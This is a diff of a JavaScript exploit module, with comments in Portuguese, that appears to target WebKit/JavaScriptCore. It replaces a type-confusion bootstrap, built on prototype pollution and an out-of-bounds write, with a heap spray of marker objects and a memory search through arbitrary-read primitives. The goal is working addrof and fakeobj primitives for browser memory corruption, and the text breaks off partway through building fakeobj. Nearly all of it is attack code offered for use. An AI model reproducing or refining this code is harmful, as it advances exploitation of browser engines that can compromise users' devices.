@@ -1,26 +1,34 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v91 - Definitivo com Busca de Offset)
+// js/script3/testArrayBufferVictimCrash.mjs (v92 - Final com Memory Spray & Search)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    oob_read_absolute,
-    oob_write_absolute,
     arb_read,
     arb_write,
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';
+import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK = "Exploit_Final_R48_Offset_Search";
+export const FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK = "Exploit_Final_R49_Spray";
 
+// --- Constantes para a Estratégia de Spray & Search ---
+const SPRAY_COUNT = 0x2000; // Número de objetos a pulverizar na memória
+const MARKER_1 = new AdvancedInt64(0x41414141, 0x41414141); // Assinatura única (A)
+const MARKER_2 = new AdvancedInt64(0x42424242, 0x42424242); // Assinatura única (B)
+
+// PONTO DE PESQUISA: Onde começar a procurar na memória. Este valor é um palpite
+// educado para a heap do JSC em sistemas de 64 bits e pode precisar de ajuste.
+const SEARCH_START_ADDRESS = new AdvancedInt64(0x00000008, 0x40000000); // Ex: 0x840000000
+const SEARCH_SIZE = 0x10000000; // Tamanho da região de memória a ser varrida (ex: 256MB)
+const SEARCH_STEP = 0x1000;     // Pular de página em página para uma busca mais rápida
+
+// --- Globais ---
 let g_primitives = {
     initialized: false,
     addrof: null,
     fakeobj: null,
 };
-
-const TC_TRIGGER_DV_METADATA_BASE = 0x58; 
-const TC_TRIGGER_DV_M_LENGTH_OFFSET = TC_TRIGGER_DV_METADATA_BASE + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
+let g_spray_arr = []; // Manter referência aos objetos para evitar garbage collection
 
 function isValidPointer(ptr) {
     if (!ptr || !isAdvancedInt64Object(ptr)) return false;
@@ -29,17 +37,18 @@ function isValidPointer(ptr) {
     return true;
 }
 
+// --- Função Principal do Exploit ---
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_TEST_BASE = FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK;
-    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Exploit Funcional (R48 Busca de Offset) ---`, "test");
-    
+    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Exploit Funcional (R49 Spray & Search) ---`, "test");
+
     try {
         await createRealPrimitives();
         if (!g_primitives.initialized) throw new Error("Falha ao inicializar as primitivas.");
         logS3("FASE 1 - SUCESSO: Primitivas 'addrof' e 'fakeobj' REAIS foram inicializadas!", "vuln");
 
-        logS3(`--- Fase 2 (R48): Exploração com Primitivas Reais ---`, "subtest");
-        const targetFunctionForLeak = function someUniqueLeakFunctionR48_Instance() {};
+        logS3(`--- Fase 2 (R49): Exploração com Primitivas Reais ---`, "subtest");
+        const targetFunctionForLeak = function someUniqueLeakFunctionR49_Instance() {};
         
         const leaked_func_addr = await g_primitives.addrof(targetFunctionForLeak);
         if(!isValidPointer(leaked_func_addr)) throw new Error(`addrof falhou em retornar um ponteiro válido: ${leaked_func_addr.toString(true)}`);
@@ -70,90 +79,74 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     }
 }
 
-async function bootstrap_find_initial_address(object_to_plant_and_find) {
-    logS3("Iniciando bootstrap: Vazando endereço inicial via Type Confusion e Busca de Offset...", "info");
-    await triggerOOB_primitive({ force_reinit: true });
-    const tc_victim_ab = new ArrayBuffer(256);
-    let probe_result = { tc_triggered: false, error: null };
-
-    function toJSON_PlantingProbe() {
-        try {
-            probe_result.tc_triggered = true;
-            this.leaked_prop = object_to_plant_and_find;
-        } catch(e) { probe_result.error = e.message; }
-        return { probe: "executed" };
-    }
-
-    const ppKey = 'toJSON';
-    let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
-    let polluted = false;
+// [ESTRATÉGIA FINAL] Função de bootstrap que pulveriza e busca na memória
+async function bootstrap_via_spray_and_search() {
+    logS3("Iniciando bootstrap: Fase de Spray...", "info");
     
-    try {
-        Object.defineProperty(Object.prototype, ppKey, { value: toJSON_PlantingProbe, writable: true, configurable: true });
-        polluted = true;
-        oob_write_absolute(TC_TRIGGER_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4); 
-        await PAUSE_S3(50);
-        JSON.stringify(tc_victim_ab); 
-    } finally {
-        if (polluted) {
-            if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey];
-        }
-        try { oob_write_absolute(TC_TRIGGER_DV_M_LENGTH_OFFSET, OOB_CONFIG.ALLOCATION_SIZE, 4); } catch(e_restore) {}
+    // 1. Fase de Spray
+    for (let i = 0; i < SPRAY_COUNT; i++) {
+        let spray_obj = [MARKER_1, MARKER_2, {}]; // Objeto com nossa assinatura
+        g_spray_arr.push(spray_obj);
     }
+    logS3(`${SPRAY_COUNT} objetos pulverizados na memória.`, "good");
+    await PAUSE_S3(100);
 
-    if (!probe_result.tc_triggered) throw new Error("Type Confusion não foi acionada.");
-    if (probe_result.error) throw new Error(`Erro na sonda de plantio: ${probe_result.error}`);
+    // 2. Fase de Busca
+    logS3(`Iniciando busca na memória de ${SEARCH_START_ADDRESS.toString(true)} a ${SEARCH_START_ADDRESS.add(SEARCH_SIZE).toString(true)}`, "info");
+    let found_butterfly_addr = null;
 
-    // [ESTRATÉGIA FINAL] Define os offsets que vamos testar.
-    const CANDIDATE_OFFSETS = [
-        JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, // 0x10
-        0x18,
-        0x20,
-        0x28,
-        0x30,
-    ];
-    
-    const dv_reader = new DataView(tc_victim_ab);
-    let found_address = null;
-
-    for (const offset of CANDIDATE_OFFSETS) {
+    for (let i = 0; i < (SEARCH_SIZE / SEARCH_STEP); i++) {
+        let current_addr = SEARCH_START_ADDRESS.add(i * SEARCH_STEP);
+        
         try {
-            const low = dv_reader.getUint32(offset, true);
-            const high = dv_reader.getUint32(offset + 4, true);
-            const potential_ptr = new AdvancedInt64(low, high);
-            
-            logS3(`[Bootstrap Search] Testando offset 0x${offset.toString(16)} -> Lido: ${potential_ptr.toString(true)}`, "debug");
-
-            if (isValidPointer(potential_ptr)) {
-                logS3(`[Bootstrap Search] SUCESSO! Ponteiro válido encontrado no offset 0x${offset.toString(16)}`, "vuln");
-                found_address = potential_ptr;
-                break; // Encontramos, sair do loop
+            const val1 = await arb_read(current_addr, 8);
+            if (val1.equals(MARKER_1)) {
+                logS3(`[Bootstrap Search] Marcador 1 encontrado em: ${current_addr.toString(true)}`, "debug");
+                const val2 = await arb_read(current_addr.add(8), 8);
+                if (val2.equals(MARKER_2)) {
+                    found_butterfly_addr = current_addr;
+                    break;
+                }
             }
-        } catch(e) { /* Ignora erros de leitura fora dos limites do buffer */ }
+        } catch(e) { /* Ignora erros de leitura de páginas inválidas */ }
     }
     
-    return found_address;
+    if (!found_butterfly_addr) {
+        return null; // Retorna nulo se não encontrar
+    }
+
+    // Encontramos o ponteiro para o butterfly. O objeto JSCell está 0x10 bytes antes.
+    const found_object_addr = found_butterfly_addr.sub(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
+    return found_object_addr;
 }
 
-
 async function createRealPrimitives() {
+    await triggerOOB_primitive({ force_reinit: true });
+
     let addrof_victim_arr = [{}];
     let fakeobj_victim_arr = [{a: 1.1}];
 
-    const addrof_victim_addr = await bootstrap_find_initial_address(addrof_victim_arr);
-    if (!addrof_victim_addr) { // bootstrap_find_initial_address retorna null em caso de falha
-        throw new Error("Falha ao encontrar um ponteiro válido em todos os offsets candidatos.");
+    // 1. Obter o endereço de bootstrap usando a nova técnica.
+    const bootstrap_addr = await bootstrap_via_spray_and_search();
+    if (!bootstrap_addr) {
+        throw new Error("Falha ao encontrar um objeto pulverizado na memória. Tente ajustar a faixa de busca.");
     }
-    logS3(`Endereço de bootstrap para addrof_victim_arr obtido: ${addrof_victim_addr.toString(true)}`, 'good');
+    logS3(`Endereço de bootstrap obtido (objeto pulverizado): ${bootstrap_addr.toString(true)}`, 'good');
 
+    // 2. Com o endereço de um objeto conhecido, construir addrof
     g_primitives.addrof = async (obj) => {
-        addrof_victim_arr[0] = obj;
-        let butterfly_addr = await arb_read(addrof_victim_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
-        return await arb_read(butterfly_addr, 8);
+        // Encontra o endereço de um dos objetos do spray que contém addrof_victim_arr
+        g_spray_arr[SPRAY_COUNT-1][2] = obj;
+        const sprayed_obj_addr = await bootstrap_via_spray_and_search();
+        
+        let butterfly_addr = await arb_read(sprayed_obj_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
+        return await arb_read(butterfly_addr.add(16), 8); // Offset 2 * 8
     };
 
+    const addrof_victim_addr = await g_primitives.addrof(addrof_victim_arr);
+
+    // 3. Construir fakeobj
     const fakeobj_victim_addr = await g_primitives.addrof(fakeobj_victim_arr);
-    if (!isValidPointer(fakeobj_victim_addr)) throw new Error("Falha ao obter o endereço do fakeobj_victim_arr via addrof.");
     const fakeobj_butterfly_addr = await arb_read(fakeobj_victim_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
 
     g_primitives.fakeobj = async (addr) => {
